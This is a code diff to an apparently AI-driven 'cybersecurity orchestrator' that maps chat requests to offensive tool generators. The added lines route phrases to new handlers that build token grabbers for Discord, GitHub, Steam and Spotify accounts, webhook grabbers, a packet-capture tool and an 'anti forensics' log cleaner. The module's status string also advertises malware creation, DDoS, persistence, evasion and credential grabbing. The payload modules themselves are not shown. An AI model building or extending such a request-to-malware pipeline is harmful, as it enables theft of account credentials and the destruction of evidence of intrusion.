@@ -18,6 +18,10 @@ from cybersecurity.advanced_payloads import AdvancedPayloads
 from cybersecurity.ai_malware_generator import AIMalwareGenerator
 from cybersecurity.ai_credential_grabber import AICredentialGrabber
 from cybersecurity.ip_grabber import IPGrabber
+from cybersecurity.webhook_grabber import WebhookGrabber
+from cybersecurity.token_grabber import TokenGrabber
+from cybersecurity.network_analyzer import NetworkAnalyzer
+from cybersecurity.log_cleaner import LogCleaner
 from mobile_security import iOSTestingTools, AndroidTestingTools
 from security.vulnerability_scanner import VulnerabilityScanner
 from cybersecurity.improvements import ImprovedNLP, EnhancedAuthorization, VSOCReporter
@@ -44,6 +48,10 @@ class EnhancedCybersecurityOrchestrator:
         self.ai_malware_generator = AIMalwareGenerator()
         self.ai_grabber = AICredentialGrabber()
         self.ip_grabber = IPGrabber()
+        self.webhook_grabber = WebhookGrabber()
+        self.token_grabber = TokenGrabber()
+        self.network_analyzer = NetworkAnalyzer()
+        self.log_cleaner = LogCleaner()
         self.ios_tools = iOSTestingTools()
         self.android_tools = AndroidTestingTools()
         self.vulnerability_scanner = VulnerabilityScanner()
@@ -109,6 +117,26 @@ class EnhancedCybersecurityOrchestrator:
         if any(word in request_lower for word in ["ip grabber", "grab ip", "get ip", "ip grab", 
                                                    "network grabber", "grab network info"]):
             return self._handle_ip_grabber(request)
+        
+        # Webhook grabber
+        if any(word in request_lower for word in ["webhook grabber", "grab webhook", "get webhook", 
+                                                   "webhook grab", "discord webhook", "slack webhook"]):
+            return self._handle_webhook_grabber(request)
+        
+        # Token grabber
+        if any(word in request_lower for word in ["token grabber", "grab token", "get token", 
+                                                   "token grab", "discord token", "github token"]):
+            return self._handle_token_grabber(request)
+        
+        # Network analyzer
+        if any(word in request_lower for word in ["network analyzer", "analyze network", "traffic analyzer", 
+                                                   "packet capture", "network traffic"]):
+            return self._handle_network_analyzer(request)
+        
+        # Log cleaner
+        if any(word in request_lower for word in ["log cleaner", "clean logs", "clear logs", 
+                                                   "anti forensics", "clean history"]):
+            return self._handle_log_cleaner(request)
         
         # Build custom malware
         if any(word in request_lower for word in ["build", "create custom", "make", "generate"]):
@@ -403,7 +431,94 @@ class EnhancedCybersecurityOrchestrator:
             return self.base_orchestrator.process(
                 f"{SECURITY_PRIVACY_PROMPT}\n\nUser question: {request}"
             )
-        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, anti-detection, process injection, advanced obfuscation, custom malware builder, advanced payloads, AI malware generation, AI credential grabber, IP grabber, iOS/Android security tools, scanning, reporting."
+        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, anti-detection, process injection, advanced obfuscation, custom malware builder, advanced payloads, AI malware generation, AI credential grabber, IP grabber, webhook grabber, token grabber, network analyzer, log cleaner, iOS/Android security tools, scanning, reporting."
+    
+    def _handle_webhook_grabber(self, request: str) -> str:
+        """Handle webhook grabber requests"""
+        request_lower = request.lower()
+        
+        target_types = []
+        if "discord" in request_lower:
+            target_types.append("discord")
+        if "slack" in request_lower:
+            target_types.append("slack")
+        if "telegram" in request_lower:
+            target_types.append("telegram")
+        if "generic" in request_lower or "all" in request_lower:
+            target_types.append("generic")
+        target_types = target_types or ["discord", "slack", "telegram", "generic"]
+        
+        test_webhook = "test" in request_lower or "verify" in request_lower
+        
+        result = self.webhook_grabber.create_webhook_grabber(target_types, test_webhook)
+        return f"Created webhook grabber: {result['file']}. Targets: {', '.join(result['target_types'])}. {result['warning']}"
+    
+    def _handle_token_grabber(self, request: str) -> str:
+        """Handle token grabber requests"""
+        request_lower = request.lower()
+        
+        target_types = []
+        if "discord" in request_lower:
+            target_types.append("discord")
+        if "github" in request_lower:
+            target_types.append("github")
+        if "steam" in request_lower:
+            target_types.append("steam")
+        if "spotify" in request_lower:
+            target_types.append("spotify")
+        if "generic" in request_lower or "all" in request_lower:
+            target_types.append("generic")
+        target_types = target_types or ["discord", "github", "steam", "spotify", "generic"]
+        
+        result = self.token_grabber.create_token_grabber(target_types)
+        return f"Created token grabber: {result['file']}. Targets: {', '.join(result['target_types'])}. {result['warning']}"
+    
+    def _handle_network_analyzer(self, request: str) -> str:
+        """Handle network analyzer requests"""
+        request_lower = request.lower()
+        
+        analysis_types = []
+        if "packet" in request_lower or "capture" in request_lower:
+            analysis_types.append("packet_capture")
+        if "traffic" in request_lower:
+            analysis_types.append("traffic_analysis")
+        if "protocol" in request_lower:
+            analysis_types.append("protocol_analysis")
+        if "suspicious" in request_lower:
+            analysis_types.append("suspicious_activity")
+        analysis_types = analysis_types or ["packet_capture", "traffic_analysis", "protocol_analysis"]
+        
+        # Extract duration
+        import re
+        duration_match = re.search(r'(\\d+)\\s*(?:second|sec|minute|min)', request_lower)
+        duration = int(duration_match.group(1)) if duration_match else 60
+        if "minute" in request_lower or "min" in request_lower:
+            duration *= 60
+        
+        result = self.network_analyzer.create_network_analyzer(analysis_types, duration)
+        return f"Created network analyzer: {result['file']}. Types: {', '.join(result['analysis_types'])}. Duration: {result['capture_duration']}s. {result['warning']}"
+    
+    def _handle_log_cleaner(self, request: str) -> str:
+        """Handle log cleaner requests"""
+        request_lower = request.lower()
+        
+        clean_types = []
+        if "system" in request_lower or "log" in request_lower:
+            clean_types.append("system_logs")
+        if "browser" in request_lower or "history" in request_lower:
+            clean_types.append("browser_history")
+        if "recent" in request_lower:
+            clean_types.append("recent_files")
+        if "temp" in request_lower:
+            clean_types.append("temp_files")
+        clean_types = clean_types or ["system_logs", "browser_history", "recent_files", "temp_files"]
+        
+        clean_method = "overwrite"
+        if "secure" in request_lower or "wipe" in request_lower:
+            clean_method = "secure_delete"
+        
+        result = self.log_cleaner.create_log_cleaner(clean_types, clean_method)
+        return f"Created log cleaner: {result['file']}. Types: {', '.join(result['clean_types'])}. Method: {result['clean_method']}. {result['warning']}"
     
     def _handle_ip_grabber(self, request: str) -> str:
         """Handle IP grabber requests"""
